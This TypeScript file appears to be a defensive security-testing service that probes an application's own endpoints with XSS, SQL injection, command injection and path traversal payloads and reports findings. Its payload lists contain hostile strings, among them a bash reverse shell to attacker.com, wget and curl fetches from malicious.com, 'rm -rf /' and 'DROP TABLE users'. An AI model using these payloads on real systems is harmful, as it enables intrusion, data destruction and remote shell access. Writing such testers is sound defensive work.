
import { env } from '../config/environment';


export interface SecurityTest {
  id: string;
  name: string;
  description: string;
  category: SecurityTestCategory;
  severity: 'low' | 'medium' | 'high' | 'critical';
  enabled: boolean;
  lastRun?: Date;
  result?: SecurityTestResult;
}

export interface SecurityTestResult {
  passed: boolean;
  score: number; // 0-100
  findings: SecurityFinding[];
  recommendations: string[];
  timestamp: Date;
}

export interface SecurityFinding {
  id: string;
  title: string;
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  cwe?: string; // Common Weakness Enumeration
  cvss?: number; // Common Vulnerability Scoring System
  remediation: string;
}

export enum SecurityTestCategory {
  AUTHENTICATION = 'authentication',
  AUTHORIZATION = 'authorization',
  INPUT_VALIDATION = 'input_validation',
  ENCRYPTION = 'encryption',
  SESSION_MANAGEMENT = 'session_management',
  API_SECURITY = 'api_security',
  DATA_PROTECTION = 'data_protection',
  CONFIGURATION = 'configuration',
  NETWORK_SECURITY = 'network_security'
}

export class SecurityTestingService {
  private static readonly XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    'javascript:alert("XSS")',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '\'><script>alert("XSS")</script>',
    '";alert("XSS");//',
    '\';alert("XSS");//'
  ];

  private static readonly SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "' UNION SELECT * FROM users--",
    "admin'--",
    "1' OR '1' = '1' #",
    "' OR 1=1 #",
    "'; EXEC xp_cmdshell('dir')--"
  ];

  private static readonly COMMAND_INJECTION_PAYLOADS = [
    '; ls -la',
    '| cat /etc/passwd',
    '&& whoami',
    '; rm -rf /',
    '| wget http://malicious.com/shell',
    '&& curl http://malicious.com/shell',
    '; nc -l 4444',
    '| bash -i >& /dev/tcp/attacker.com/4444 0>&1'
  ];

  private static readonly PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
  ];

  // Test for XSS vulnerabilities
  static async testXSSVulnerability(
    endpoint: string,
    method: string,
    payloads: string[] = this.XSS_PAYLOADS
  ): Promise<SecurityTestResult> {
    const findings: SecurityFinding[] = [];
    let passed = true;
    let score = 100;

    for (const payload of payloads) {
      try {
        const response = await this.sendTestRequest(endpoint, method, { test: payload });
        
        if (this.detectXSSInResponse(response)) {
          findings.push({
            id: `xss_${Date.now()}`,
            title: 'Cross-Site Scripting (XSS) Vulnerability',
            description: `XSS payload "${payload}" was reflected in the response`,
            severity: 'high',
            cwe: 'CWE-79',
            cvss: 6.1,
            remediation: 'Implement proper input validation and output encoding'
          });
          passed = false;
          score -= 20;
        }
      } catch {
        // Request failed, which might indicate security measures are in place
      }
    }

    return {
      passed,
      score: Math.max(0, score),
      findings,
      recommendations: this.getXSSRecommendations(),
      timestamp: new Date()
    };
  }

  // Test for SQL injection vulnerabilities
  static async testSQLInjection(
    endpoint: string,
    method: string,
    payloads: string[] = this.SQL_INJECTION_PAYLOADS
  ): Promise<SecurityTestResult> {
    const findings: SecurityFinding[] = [];
    let passed = true;
    let score = 100;

    for (const payload of payloads) {
      try {
        const response = await this.sendTestRequest(endpoint, method, { query: payload });
        
        if (this.detectSQLInjectionInResponse(response)) {
          findings.push({
            id: `sqli_${Date.now()}`,
            title: 'SQL Injection Vulnerability',
            description: `SQL injection payload "${payload}" caused an error or unexpected response`,
            severity: 'critical',
            cwe: 'CWE-89',
            cvss: 9.8,
            remediation: 'Use parameterized queries and input validation'
          });
          passed = false;
          score -= 30;
        }
      } catch {
        // Request failed, which might indicate security measures are in place
      }
    }

    return {
      passed,
      score: Math.max(0, score),
      findings,
      recommendations: this.getSQLInjectionRecommendations(),
      timestamp: new Date()
    };
  }

  // Test for command injection vulnerabilities
  static async testCommandInjection(
    endpoint: string,
    method: string,
    payloads: string[] = this.COMMAND_INJECTION_PAYLOADS
  ): Promise<SecurityTestResult> {
    const findings: SecurityFinding[] = [];
    let passed = true;
    let score = 100;

    for (const payload of payloads) {
      try {
        const response = await this.sendTestRequest(endpoint, method, { command: payload });
        
        if (this.detectCommandInjectionInResponse(response)) {
          findings.push({
            id: `cmdi_${Date.now()}`,
            title: 'Command Injection Vulnerability',
            description: `Command injection payload "${payload}" was executed`,
            severity: 'critical',
            cwe: 'CWE-78',
            cvss: 9.8,
            remediation: 'Avoid command execution and use safe alternatives'
          });
          passed = false;
          score -= 30;
        }
      } catch {
        // Request failed, which might indicate security measures are in place
      }
    }

    return {
      passed,
      score: Math.max(0, score),
      findings,
      recommendations: this.getCommandInjectionRecommendations(),
      timestamp: new Date()
    };
  }

  // Test for path traversal vulnerabilities
  static async testPathTraversal(
    endpoint: string,
    method: string,
    payloads: string[] = this.PATH_TRAVERSAL_PAYLOADS
  ): Promise<SecurityTestResult> {
    const findings: SecurityFinding[] = [];
    let passed = true;
    let score = 100;

    for (const payload of payloads) {
      try {
        const response = await this.sendTestRequest(endpoint, method, { file: payload });
        
        if (this.detectPathTraversalInResponse(response)) {
          findings.push({
            id: `pt_${Date.now()}`,
            title: 'Path Traversal Vulnerability',
            description: `Path traversal payload "${payload}" accessed unauthorized files`,
            severity: 'high',
            cwe: 'CWE-22',
            cvss: 7.5,
            remediation: 'Validate and sanitize file paths'
          });
          passed = false;
          score -= 25;
        }
      } catch {
        // Request failed, which might indicate security measures are in place
      }
    }

    return {
      passed,
      score: Math.max(0, score),
      findings,
      recommendations: this.getPathTraversalRecommendations(),
      timestamp: new Date()
    };
  }

  // Test authentication security
  static async testAuthenticationSecurity(): Promise<SecurityTestResult> {
    const findings: SecurityFinding[] = [];
    let passed = true;
    let score = 100;

    // Test password policy
    const weakPasswords = ['password', '123456', 'admin', 'test'];
    for (const password of weakPasswords) {
      try {
        const response = await this.sendTestRequest('/api/auth/login', 'POST', {
          email: 'test@example.com',
          password
        });
        
        if (response.status === 200) {
          findings.push({
            id: `auth_weak_password_${Date.now()}`,
            title: 'Weak Password Policy',
            description: `Weak password "${password}" was accepted`,
            severity: 'medium',
            cwe: 'CWE-521',
            cvss: 5.3,
            remediation: 'Implement strong password requirements'
          });
          passed = false;
          score -= 15;
        }
      } catch {
        // Expected behavior
      }
    }

    // Test brute force protection
    for (let i = 0; i < 10; i++) {
      try {
        await this.sendTestRequest('/api/auth/login', 'POST', {
          email: 'test@example.com',
          password: 'wrongpassword'
        });
      } catch {
        // Expected behavior
      }
    }

    // Check if rate limiting is working
    try {
      const response = await this.sendTestRequest('/api/auth/login', 'POST', {
        email: 'test@example.com',
        password: 'wrongpassword'
      });
      
      if (response.status !== 429) {
        findings.push({
          id: `auth_rate_limit_${Date.now()}`,
          title: 'Missing Rate Limiting',
          description: 'No rate limiting detected on login endpoint',
          severity: 'medium',
          cwe: 'CWE-307',
          cvss: 5.3,
          remediation: 'Implement rate limiting on authentication endpoints'
        });
        passed = false;
        score -= 10;
      }
    } catch {
      // Expected behavior
    }

    return {
      passed,
      score: Math.max(0, score),
      findings,
      recommendations: this.getAuthenticationRecommendations(),
      timestamp: new Date()
    };
  }

  // Test authorization security
  static async testAuthorizationSecurity(): Promise<SecurityTestResult> {
    const findings: SecurityFinding[] = [];
    let passed = true;
    let score = 100;

    // Test horizontal privilege escalation
    const testEndpoints = [
      '/api/users/1',
      '/api/transactions/1',
      '/api/projects/1'
    ];

    for (const endpoint of testEndpoints) {
      try {
        const response = await this.sendTestRequest(endpoint, 'GET', {});
        
        if (response.status === 200) {
          findings.push({
            id: `auth_horizontal_${Date.now()}`,
            title: 'Horizontal Privilege Escalation',
            description: `Unauthorized access to ${endpoint}`,
            severity: 'high',
            cwe: 'CWE-285',
            cvss: 6.5,
            remediation: 'Implement proper authorization checks'
          });
          passed = false;
          score -= 20;
        }
      } catch {
        // Expected behavior
      }
    }

    // Test vertical privilege escalation
    const adminEndpoints = [
      '/api/admin/users',
      '/api/admin/system',
      '/api/admin/logs'
    ];

    for (const endpoint of adminEndpoints) {
      try {
        const response = await this.sendTestRequest(endpoint, 'GET', {});
        
        if (response.status === 200) {
          findings.push({
            id: `auth_vertical_${Date.now()}`,
            title: 'Vertical Privilege Escalation',
            description: `Unauthorized access to admin endpoint ${endpoint}`,
            severity: 'critical',
            cwe: 'CWE-285',
            cvss: 8.8,
            remediation: 'Implement role-based access control'
          });
          passed = false;
          score -= 30;
        }
      } catch {
        // Expected behavior
      }
    }

    return {
      passed,
      score: Math.max(0, score),
      findings,
      recommendations: this.getAuthorizationRecommendations(),
      timestamp: new Date()
    };
  }

  // Test encryption and data protection
  static async testEncryptionSecurity(): Promise<SecurityTestResult> {
    const findings: SecurityFinding[] = [];
    let passed = true;
    let score = 100;

    // Test HTTPS enforcement
    try {
      const response = await fetch('http://localhost:3000/api/test', {
        method: 'GET'
      });
      
      if (response.status !== 301 && response.status !== 302) {
        findings.push({
          id: `enc_https_${Date.now()}`,
          title: 'Missing HTTPS Enforcement',
          description: 'HTTP requests are not redirected to HTTPS',
          severity: 'medium',
          cwe: 'CWE-319',
          cvss: 5.3,
          remediation: 'Enforce HTTPS for all requests'
        });
        passed = false;
        score -= 10;
      }
    } catch {
      // Expected behavior
    }

    // Test security headers
    try {
      const response = await fetch('https://localhost:3000/api/test', {
        method: 'GET'
      });
      
      const headers = response.headers;
      const requiredHeaders = [
        'strict-transport-security',
        'content-security-policy',
        'x-frame-options',
        'x-content-type-options'
      ];

      for (const header of requiredHeaders) {
        if (!headers.get(header)) {
          findings.push({
            id: `enc_headers_${Date.now()}`,
            title: 'Missing Security Headers',
            description: `Missing security header: ${header}`,
            severity: 'low',
            cwe: 'CWE-693',
            cvss: 3.1,
            remediation: 'Implement all required security headers'
          });
          passed = false;
          score -= 5;
        }
      }
    } catch {
      // Expected behavior
    }

    return {
      passed,
      score: Math.max(0, score),
      findings,
      recommendations: this.getEncryptionRecommendations(),
      timestamp: new Date()
    };
  }

  // Run comprehensive security test suite
  static async runSecurityTestSuite(): Promise<{
    overallScore: number;
    tests: SecurityTest[];
    summary: {
      passed: number;
      failed: number;
      critical: number;
      high: number;
      medium: number;
      low: number;
    };
  }> {
    const tests: SecurityTest[] = [];
    let totalScore = 0;
    let testCount = 0;

    // Run all security tests
    const testResults = await Promise.all([
      this.testXSSVulnerability('/api/test', 'POST'),
      this.testSQLInjection('/api/test', 'POST'),
      this.testCommandInjection('/api/test', 'POST'),
      this.testPathTraversal('/api/test', 'GET'),
      this.testAuthenticationSecurity(),
      this.testAuthorizationSecurity(),
      this.testEncryptionSecurity()
    ]);

    testResults.forEach((result, index) => {
      const test: SecurityTest = {
        id: `test_${index}`,
        name: `Security Test ${index + 1}`,
        description: `Automated security test ${index + 1}`,
        category: SecurityTestCategory.AUTHENTICATION,
        severity: 'medium',
        enabled: true,
        lastRun: new Date(),
        result
      };
      
      tests.push(test);
      totalScore += result.score;
      testCount++;
    });

    const overallScore = testCount > 0 ? totalScore / testCount : 0;

    // Calculate summary
    const summary = {
      passed: testResults.filter(r => r.passed).length,
      failed: testResults.filter(r => !r.passed).length,
      critical: testResults.flatMap(r => r.findings).filter(f => f.severity === 'critical').length,
      high: testResults.flatMap(r => r.findings).filter(f => f.severity === 'high').length,
      medium: testResults.flatMap(r => r.findings).filter(f => f.severity === 'medium').length,
      low: testResults.flatMap(r => r.findings).filter(f => f.severity === 'low').length
    };

    return {
      overallScore,
      tests,
      summary
    };
  }

  // Helper methods for detection
  private static detectXSSInResponse(response: unknown): boolean {
    const responseText = JSON.stringify(response);
    return this.XSS_PAYLOADS.some(payload => 
      responseText.includes(payload.replace(/[<>"']/g, ''))
    );
  }

  private static detectSQLInjectionInResponse(response: unknown): boolean {
    const responseText = JSON.stringify(response);
    const sqlErrorPatterns = [
      'sql syntax',
      'mysql error',
      'oracle error',
      'sql server',
      'postgresql error'
    ];
    
    return sqlErrorPatterns.some(pattern => 
      responseText.toLowerCase().includes(pattern)
    );
  }

  private static detectCommandInjectionInResponse(response: unknown): boolean {
    const responseText = JSON.stringify(response);
    const commandOutputPatterns = [
      'root:x:0:0',
      'drwxr-xr-x',
      'total ',
      'bin/bash'
    ];
    
    return commandOutputPatterns.some(pattern => 
      responseText.includes(pattern)
    );
  }

  private static detectPathTraversalInResponse(response: unknown): boolean {
    const responseText = JSON.stringify(response);
    const pathTraversalPatterns = [
      'root:x:0:0',
      '[boot loader]',
      'windows\\system32'
    ];
    
    return pathTraversalPatterns.some(pattern => 
      responseText.includes(pattern)
    );
  }

  // Helper method to send test requests
  private static async sendTestRequest(
    endpoint: string,
    method: string,
    data: unknown
  ): Promise<Response> {
    const url = `${env.apiUrl}${endpoint}`;
    
    const requestInit: RequestInit = {
      method,
      headers: {
        'Content-Type': 'application/json'
      }
    };

    if (method !== 'GET') {
      requestInit.body = JSON.stringify(data);
    }
    
    return fetch(url, requestInit);
  }

  // Recommendation methods
  private static getXSSRecommendations(): string[] {
    return [
      'Implement input validation and sanitization',
      'Use output encoding for all user-supplied data',
      'Implement Content Security Policy (CSP)',
      'Use modern frameworks with built-in XSS protection'
    ];
  }

  private static getSQLInjectionRecommendations(): string[] {
    return [
      'Use parameterized queries or prepared statements',
      'Implement input validation and sanitization',
      'Use an ORM with built-in SQL injection protection',
      'Implement principle of least privilege for database users'
    ];
  }

  private static getCommandInjectionRecommendations(): string[] {
    return [
      'Avoid command execution entirely',
      'Use safe alternatives like APIs or libraries',
      'Implement strict input validation',
      'Use sandboxed environments if command execution is necessary'
    ];
  }

  private static getPathTraversalRecommendations(): string[] {
    return [
      'Validate and sanitize all file paths',
      'Use whitelist approach for allowed files',
      'Implement proper file permissions',
      'Use safe file handling libraries'
    ];
  }

  private static getAuthenticationRecommendations(): string[] {
    return [
      'Implement strong password policies',
      'Use multi-factor authentication',
      'Implement account lockout mechanisms',
      'Use secure session management'
    ];
  }

  private static getAuthorizationRecommendations(): string[] {
    return [
      'Implement role-based access control (RBAC)',
      'Use principle of least privilege',
      'Implement proper authorization checks',
      'Use secure token-based authentication'
    ];
  }

  private static getEncryptionRecommendations(): string[] {
    return [
      'Enforce HTTPS for all communications',
      'Implement proper security headers',
      'Use strong encryption algorithms',
      'Implement secure key management'
    ];
  }
} 